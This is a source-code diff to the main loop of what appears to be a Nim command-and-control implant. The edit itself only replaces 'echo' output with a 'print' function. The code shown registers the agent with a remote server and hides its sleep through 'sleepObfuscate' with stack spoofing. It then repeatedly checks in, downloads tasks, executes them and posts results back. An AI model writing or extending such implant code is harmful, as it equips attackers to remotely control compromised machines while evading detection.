@@ -1,6 +1,6 @@
 import strformat, os, times, system, base64, random
 
-import core/[http, context, sleepmask]
+import core/[http, context, sleepmask, io]
 import protocol/[task, result, heartbeat, registration]
 import ../common/[types, utils, crypto]
 
@@ -17,9 +17,9 @@ proc main() =
     let registrationBytes = ctx.serializeRegistrationData(registration)
 
     if not ctx.httpPost(registrationBytes): 
-        echo "[-] Agent registration failed."
+        print("[-] Agent registration failed.")
         quit(0)
-    echo fmt"[+] [{ctx.agentId}] Agent registered."
+    print fmt"[+] [{ctx.agentId}] Agent registered."
 
     #[
         Agent routine: 
@@ -34,7 +34,7 @@ proc main() =
         sleepObfuscate(ctx.sleep * 1000, ctx.sleepTechnique, ctx.spoofStack)
 
         let date: string = now().format("dd-MM-yyyy HH:mm:ss")
-        echo "\n", fmt"[*] [{date}] Checking in."
+        print "\n", fmt"[*] [{date}] Checking in."
 
         try: 
             # Retrieve task queue for the current agent by sending a check-in/heartbeat request
@@ -45,13 +45,13 @@ proc main() =
                 packet: string = ctx.httpGet(heartbeatBytes)
 
             if packet.len <= 0: 
-                echo "[*] No tasks to execute."
+                print("[*] No tasks to execute.")
                 continue
 
             let tasks: seq[Task] = ctx.deserializePacket(packet)
             
             if tasks.len <= 0: 
-                echo "[*] No tasks to execute."
+                print("[*] No tasks to execute.")
                 continue
 
             # Execute all retrieved tasks and return their output to the server
@@ -62,7 +62,7 @@ proc main() =
                 ctx.httpPost(resultBytes)
 
         except CatchableError as err: 
-            echo "[-] ", err.msg
+            print("[-] ", err.msg)
 
 when isMainModule:
     main() 
